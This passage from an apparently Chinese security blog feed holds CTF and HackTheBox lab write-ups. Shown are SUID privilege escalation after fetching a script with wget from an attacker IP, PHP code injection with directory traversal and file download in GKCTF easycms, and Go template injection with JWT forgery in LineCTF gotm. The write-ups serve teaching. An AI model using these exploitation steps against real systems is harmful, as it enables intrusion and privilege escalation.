<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.7/full-checkup.sh
chmod +x full-checkup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205810653.png"></p>
<p>å†æ¬¡æ‰§è¡Œ<code>full-checkup</code>é€‰é¡¹ï¼Œå¯çœ‹åˆ°<code>/bin/bash</code>å·²æˆåŠŸè®¾ç½®suid</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205833873.png"></p>
<p>æ‰§è¡Œ<code>bash -p</code>æˆåŠŸè·å–rootæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230410205918651.png"></p>
<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411181759774.png" style="zoom: 80%;">

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/qq_58869808/article/details/130050438">https://blog.csdn.net/qq_58869808/article/details/130050438</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>gitä¿¡æ¯æ³„éœ²</tag>
        <tag>å‘½ä»¤æ³¨å…¥</tag>
        <tag>suidææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/posts/4a17b156.html</url>
    <content><![CDATA[<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>Hello World</category>
      </categories>
      <tags>
        <tag>Hello World</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF2021-easycms</title>
    <url>/posts/3e3db684.html</url>
    <content><![CDATA[<h1 id="GKCTF2021-easycms"><a href="#GKCTF2021-easycms" class="headerlink" title="GKCTF2021-easycms"></a>GKCTF2021-easycms</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šç›®å½•éå†ã€ä»»æ„ä»£ç æ‰§è¡Œã€ä»»æ„æ–‡ä»¶ä¸‹è½½</p>
<p>é¢˜ç›®hintï¼šåå°å¯†ç 5ä½å¼±å£ä»¤</p>
<p>é¦–é¡µ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913100735401.png"></p>
<p>æ ¹æ®é¢˜ç›®hintï¼ŒçŸ¥é“æœ‰åå°ï¼Œçˆ†ç ´å¾—åå°è·¯å¾„<code>/admin.php</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913100925523.png" style="zoom: 80%;">

<p>å¼±å£ä»¤ï¼š<code>admin:12356</code></p>
<h2 id="æ€è·¯ä¸€ï¼ˆç›®å½•ç©¿è¶Š-amp-ä»»æ„ä»£ç æ‰§è¡Œï¼‰"><a href="#æ€è·¯ä¸€ï¼ˆç›®å½•ç©¿è¶Š-amp-ä»»æ„ä»£ç æ‰§è¡Œï¼‰" class="headerlink" title="æ€è·¯ä¸€ï¼ˆç›®å½•ç©¿è¶Š&amp;ä»»æ„ä»£ç æ‰§è¡Œï¼‰"></a>æ€è·¯ä¸€ï¼ˆç›®å½•ç©¿è¶Š&amp;ä»»æ„ä»£ç æ‰§è¡Œï¼‰</h2><p>ç™»å½•æˆåŠŸåï¼Œå·¦ä¾§èœå•æ <code>UI</code>â†’<code>Theme</code>ï¼Œéšä¾¿ä¸€ä¸ªä¸»é¢˜ç‚¹å‡»å³ä¸‹è§’<code>Customize</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913102917390.png" style="zoom: 80%;">

<p>ç¼–è¾‘<code>Header</code>ï¼Œç‚¹å‡»å³ä¸Šè§’<code>Edit</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913103013797.png"></p>
<p>å¯ä»¥å†™å…¥phpä»£ç ï¼Œå†™å…¥<code>&lt;?php phpinfo();?&gt;</code>è¯•è¯•</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120029727.png" style="zoom:80%;">

<p>ä¿å­˜ï¼Œæ˜¾ç¤ºå¦‚ä¸‹ï¼Œéœ€è¦åˆ›å»º<code>/var/www/html/system/tmp/saec.txt</code>æ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120115840.png"></p>
<p>å·¦ä¾§èœå•æ ï¼Œ<code>UI</code>â†’<code>CMPT</code>â†’<code>Source List</code>ï¼Œæœ‰ä¸ªä¸Šä¼ åŠŸèƒ½ï¼Œéšä¾¿ä¸Šä¼ ä¸ª<code>1.txt</code>ï¼ˆå¤§å°ä¸èƒ½ä¸º0kbï¼‰</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120311662.png"></p>
<p>ä¸Šä¼ å¥½åï¼Œç‚¹å‡»å³ä¸Šè§’ç¼–è¾‘</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120359611.png"></p>
<p><code>Title</code>æ–‡æœ¬æ¡†å¡«å¦‚ä¸‹å†…å®¹ï¼ˆ<code>../</code>å¤šä¸€å±‚å°‘ä¸€å±‚éƒ½ä¸è¡Œï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">../../../../../system/tmp/saec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120554048.png"></p>
<p>ä¿å­˜åï¼Œå†æ¬¡ç‚¹å‡»ç¼–è¾‘æŸ¥çœ‹ï¼ŒPathå·²ç»å˜æˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå®ç°ç›®å½•ç©¿è¶Š</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120619055.png"></p>
<p>å†æ¬¡å›åˆ°<code>UI</code>â†’<code>Theme</code>â†’<code>Customize</code>ï¼ŒæŒ‰åˆšæ‰çš„æ­¥éª¤å†™å…¥phpinfoä»£ç åï¼Œç‚¹å‡»å³ä¸Šè§’<code>Visual Editor</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120822641.png"></p>
<p>å¯çœ‹åˆ°phpinfoå·²è¢«æˆåŠŸæ‰§è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913120908384.png"></p>
<p>é‚£ä¹ˆåŒæ ·å†™å…¥å¦‚ä¸‹ä»£ç ï¼ŒæŸ¥çœ‹flagå³å¯</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php system("cat /flag");?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913130342425.png"></p>
<h2 id="æ€è·¯äºŒï¼ˆä»»æ„æ–‡ä»¶ä¸‹è½½ï¼‰"><a href="#æ€è·¯äºŒï¼ˆä»»æ„æ–‡ä»¶ä¸‹è½½ï¼‰" class="headerlink" title="æ€è·¯äºŒï¼ˆä»»æ„æ–‡ä»¶ä¸‹è½½ï¼‰"></a>æ€è·¯äºŒï¼ˆä»»æ„æ–‡ä»¶ä¸‹è½½ï¼‰</h2><p>å·¦ä¾§èœå•æ <code>UI</code>â†’<code>Theme</code>â†’<code>Customize</code>ï¼Œç‚¹å‡»å³ä¸Šè§’<code>Export Theme</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913130849657.png"></p>
<p>éšä¾¿å¡«ï¼Œç‚¹å‡»ä¿å­˜ï¼Œä¼šè‡ªåŠ¨ä¸‹è½½<code>Theme</code>æ–‡ä»¶</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913130921241.png" style="zoom:80%;">

<p>æŠŠä¸‹è½½é“¾æ¥å¤åˆ¶å‡ºæ¥ï¼Œthemeå‚æ•°å€¼æ˜¯base64ç¼–ç </p>
<pre class="line-numbers language-none"><code class="language-none">http://f68d3c85-3d68-46dd-a9c3-702d9b2c43d4.node4.buuoj.cn:81/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è§£ç å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">/var/www/html/system/tmp/theme/default/1.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é‚£ä¹ˆä¿®æ”¹æˆ<code>/flag</code>çš„base64ç¼–ç <code>L2ZsYWc=</code></p>
<pre class="line-numbers language-none"><code class="language-none">http://f68d3c85-3d68-46dd-a9c3-702d9b2c43d4.node4.buuoj.cn:81/admin.php?m=ui&amp;f=downloadtheme&amp;theme=L2ZsYWc=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è®¿é—®ï¼Œä¸‹è½½å®Œæˆåï¼Œè®°äº‹æœ¬æ‰“å¼€å³å¯çœ‹åˆ°flag</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230913131202841.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/scrawman/article/details/122619270">https://blog.csdn.net/scrawman/article/details/122619270</a></p>
<p><a href="https://www.cnblogs.com/hiny0/p/15110817.html">https://www.cnblogs.com/hiny0/p/15110817.html</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ä»»æ„ä»£ç æ‰§è¡Œ</tag>
        <tag>ä»»æ„æ–‡ä»¶ä¸‹è½½</tag>
        <tag>ç›®å½•éå†</tag>
      </tags>
  </entry>
  <entry>
    <title>LineCTF2022-gotm</title>
    <url>/posts/4e3093bf.html</url>
    <content><![CDATA[<h1 id="LineCTF2022-gotm"><a href="#LineCTF2022-gotm" class="headerlink" title="LineCTF2022-gotm"></a>LineCTF2022-gotm</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šSSTIæ¨¡æ¿æ³¨å…¥ã€JWTä¼ªé€ </p>
<p>é¢˜ç›®ç»™å‡ºäº†goæºç <strong>ï¼ˆæœ«å°¾æœ‰å®Œæ•´ä»£ç ï¼‰</strong></p>
<p>Accountç»“æ„ä½“ï¼Œä¸»è¦å°±å››ä¸ªå±æ€§</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> Account <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	id         <span class="token builtin">string</span>
	pw         <span class="token builtin">string</span>
	is_admin   <span class="token builtin">bool</span>
	secret_key <span class="token builtin">string</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ³¨å†ŒåŠŸèƒ½ï¼š<code>http.HandleFunc("/regist", regist_handler)</code></p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">regist_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	uid <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>	#è¯»å–å‚æ•°idå€¼
	upw <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"pw"</span><span class="token punctuation">)</span>	#è¯»å–å‚æ•°pwå€¼

	<span class="token keyword">if</span> uid <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> upw <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>	#åˆ¤æ–­idå’Œpwæ˜¯å¦ä¸ºç©º
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token function">get_account</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">.</span>id <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>	#æ ¹æ®idåˆ¤æ–­ï¼Œè‹¥ç”¨æˆ·å·²å­˜åœ¨ï¼ŒæŠ¥é”™
		w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusForbidden<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>acc<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">4</span> <span class="token punctuation">{</span>
		<span class="token function">clear_account</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	new_acc <span class="token operator">:=</span> Account<span class="token punctuation">{</span>uid<span class="token punctuation">,</span> upw<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> secret_key<span class="token punctuation">}</span>	#åˆ›å»ºè´¦æˆ·çš„å››ä¸ªå±æ€§ï¼Œåªæœ‰idå’Œpwå¯æ§
	acc <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>acc<span class="token punctuation">,</span> new_acc<span class="token punctuation">)</span>

	p <span class="token operator">:=</span> Resp<span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">}</span>
	res<span class="token punctuation">,</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
	<span class="token punctuation">}</span>
	w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
	<span class="token keyword">return</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ³¨å†Œç”¨æˆ·ä¼ å‚å¦‚ä¸‹ï¼Œæ³¨å†ŒæˆåŠŸ</p>
<pre class="line-numbers language-none"><code class="language-none">/regist?id=2&amp;pw=password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230810134534148.png"></p>
<p>get_account()å‡½æ•°</p>
<pre class="line-numbers language-none"><code class="language-none">func get_account(uid string) Account {
	for i := range acc {
		if acc[i].id == uid {
			return acc[i]
		}
	}
	return Account{}
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>accåœ¨ä»£ç å‰é¢çš„å®šä¹‰æ˜¯<code>var acc []Account</code>ï¼Œæ˜¯å…¨å±€æ•°ç»„å˜é‡</p>
<p>ç™»å½•è®¤è¯åŠŸèƒ½ï¼š<code>http.HandleFunc("/auth", auth_handler)</code></p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">auth_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	uid <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>
	upw <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"pw"</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> uid <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> upw <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>acc<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1024</span> <span class="token punctuation">{</span>
		<span class="token function">clear_account</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>
	user_acc <span class="token operator">:=</span> <span class="token function">get_account</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span>
	<span class="token keyword">if</span> user_acc<span class="token punctuation">.</span>id <span class="token operator">!=</span> <span class="token string">""</span> <span class="token operator">&amp;&amp;</span> user_acc<span class="token punctuation">.</span>pw <span class="token operator">==</span> upw <span class="token punctuation">{</span>
		token<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">jwt_encode</span><span class="token punctuation">(</span>user_acc<span class="token punctuation">.</span>id<span class="token punctuation">,</span> user_acc<span class="token punctuation">.</span>is_admin<span class="token punctuation">)</span>	#ç”Ÿæˆjwt
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span>
		p <span class="token operator">:=</span> TokenResp<span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">,</span> token<span class="token punctuation">}</span>	#è¿”å›jwt
		res<span class="token punctuation">,</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		<span class="token punctuation">}</span>
		w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
	w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusForbidden<span class="token punctuation">)</span>
	<span class="token keyword">return</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç”¨åˆšæ‰æ³¨å†Œçš„è´¦æˆ·è®¤è¯ï¼Œè®¤è¯æˆåŠŸï¼Œè¿”å›jwt</p>
<pre class="line-numbers language-none"><code class="language-none">/auth?id=2&amp;pw=password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230810134644961.png"></p>
<pre class="line-numbers language-none"><code class="language-none">{"status":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjIiLCJpc19hZG1pbiI6ZmFsc2V9.e418r9xtLSloAZhbw0hbSa-xOF03AqyBoovOzWRkHoA"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>SSTIæ¼æ´äº§ç”Ÿä½ç½®ï¼š<code>http.HandleFunc("/", root_handler)</code></p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">root_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	token <span class="token operator">:=</span> r<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"X-Token"</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> token <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		id<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> <span class="token function">jwt_decode</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>	#ä»jwtä¸­è§£æå‡ºidå±æ€§
		acc <span class="token operator">:=</span> <span class="token function">get_account</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>	#æ ¹æ®idï¼ŒæŸ¥æ‰¾è´¦æˆ·
		tpl<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token string">"Logged in as "</span> <span class="token operator">+</span> acc<span class="token punctuation">.</span>id<span class="token punctuation">)</span> #acc<span class="token punctuation">.</span>idå­˜åœ¨SSTI
		<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		<span class="token punctuation">}</span>
		tpl<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token operator">&amp;</span>acc<span class="token punctuation">)</span>
	<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>

		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230810135001493.png"></p>
<p>flagè¯»å–åŠŸèƒ½ï¼š<code>http.HandleFunc("/flag", flag_handler)</code></p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">flag_handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	token <span class="token operator">:=</span> r<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"X-Token"</span><span class="token punctuation">)</span>	
	<span class="token keyword">if</span> token <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		id<span class="token punctuation">,</span> is_admin <span class="token operator">:=</span> <span class="token function">jwt_decode</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>	#ä»jwtè§£æå‡ºidå’Œis_adminå±æ€§
		<span class="token keyword">if</span> is_admin <span class="token operator">==</span> <span class="token boolean">true</span> <span class="token punctuation">{</span>	#åˆ¤æ–­is_adminå±æ€§ä¸º<span class="token boolean">true</span>æ‰å¯ä»¥è¿”å›flag
			p <span class="token operator">:=</span> Resp<span class="token punctuation">{</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"Hi "</span> <span class="token operator">+</span> id <span class="token operator">+</span> <span class="token string">", flag is "</span> <span class="token operator">+</span> flag<span class="token punctuation">}</span>
			res<span class="token punctuation">,</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
			<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
			<span class="token punctuation">}</span>
			w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
			w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusForbidden<span class="token punctuation">)</span>
			<span class="token keyword">return</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ ¹æ®regist_handler()ï¼Œæˆ‘ä»¬çŸ¥é“æ³¨å†Œè´¦æˆ·æ—¶ï¼Œé»˜è®¤ç»™çš„is_adminå±æ€§ä¸ºfalse</p>
<p>æ­¤å¤„è¦è®©flag_handler()è¿”å›flagï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡ä¼ªé€ jwtæŠŠis_adminå±æ€§ä¿®æ”¹ä¸ºtrue</p>
<p>åˆç”±äºjwtç¼–ç è¿‡ç¨‹ä¸­éœ€è¦ç”¨åˆ°secret_keyä½œç­¾åå¯†é’¥ï¼Œsecret_keyæ˜¯ç¯å¢ƒå˜é‡ï¼Œå°±éœ€è¦é€šè¿‡SSTIæ¼æ´æŠŠsecret_keyè¯»å‡ºæ¥</p>
<p>secret_keyå®šä¹‰ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">var secret_key = os.Getenv("KEY")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>jwt_encode()å‡½æ•°ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">func jwt_encode(id string, is_admin bool) (string, error) {
	claims := AccountClaims{
		id, is_admin, jwt.StandardClaims{},
	}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	return token.SignedString([]byte(secret_key))
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>SSTIæ³¨å…¥å‚è€ƒï¼š<a href="https://forum.butian.net/share/1286">https://forum.butian.net/share/1286</a></p>
<p>å¸¸è§„æ€è·¯å¯ä»¥æ³¨å…¥<code>{{.}}</code>æˆ–<code>{{.secret_key}}</code>æ¥è¯»secret_keyå±æ€§ï¼Œä½†æ­¤å¤„ç”±äº<code>root_handler()</code>å‡½æ•°å¾—åˆ°çš„accæ˜¯æ•°ç»„ä¸­çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯get_accountå‡½æ•°é€šè¿‡åœ¨å…¨å±€å˜é‡accæ•°ç»„ä¸­æŸ¥æ‰¾æˆ‘ä»¬çš„ç”¨æˆ·ï¼Œè¿™ç§æƒ…å†µä¸‹ç›´æ¥æ³¨å…¥<code>{{.secret_key}}</code>ä¼šè¿”å›ç©ºï¼Œæ‰€ä»¥æ­¤å¤„åªèƒ½ç”¨<code>{{.}}</code>æ¥è¿”å›å…¨éƒ¨å±æ€§</p>
<p>æ³¨å†Œã€è®¤è¯è·å–jwtçš„è¯·æ±‚å’Œå“åº”å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">/regist?id={{.}}&amp;pw=password
{"status":true,"msg":""}

/auth?id={{.}}&amp;pw=password
{"status":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.0Lz_3fTyhGxWGwZnw3hM_5TzDfrk0oULzLWF4rRfMss"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨æ ¹ç›®å½•ä¼ å…¥X-Tokenå¤´éƒ¨ï¼ŒæˆåŠŸè¯»åˆ°secret_key</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230810145014196.png"></p>
<p>ä¼ªé€ jwtï¼Œä¿®æ”¹å¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230810145557780.png"></p>
<p>åœ¨/flagä¼ å…¥ä¼ªé€ çš„jwtï¼Œè·å–flag</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230810145643427.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/weixin_46081055/article/details/124201444">https://blog.csdn.net/weixin_46081055/article/details/124201444</a></p>
<p><a href="https://tyskill.github.io/posts/gossti/">https://tyskill.github.io/posts/gossti/</a></p>
<h2 id="å®Œæ•´æºç "><a href="#å®Œæ•´æºç " class="headerlink" title="å®Œæ•´æºç "></a>å®Œæ•´æºç </h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"encoding/json"</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"log"</span>
	<span class="token string">"net/http"</span>
	<span class="token string">"os"</span>
	<span class="token string">"text/template"</span>

	<span class="token string">"github.com/golang-jwt/jwt"</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> Account <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	id         <span class="token builtin">string</span>
	pw         <span class="token builtin">string</span>
	is_admin   <span class="token builtin">bool</span>
	secret_key <span class="token builtin">string</span>
<span class="token punctuation">}</span>

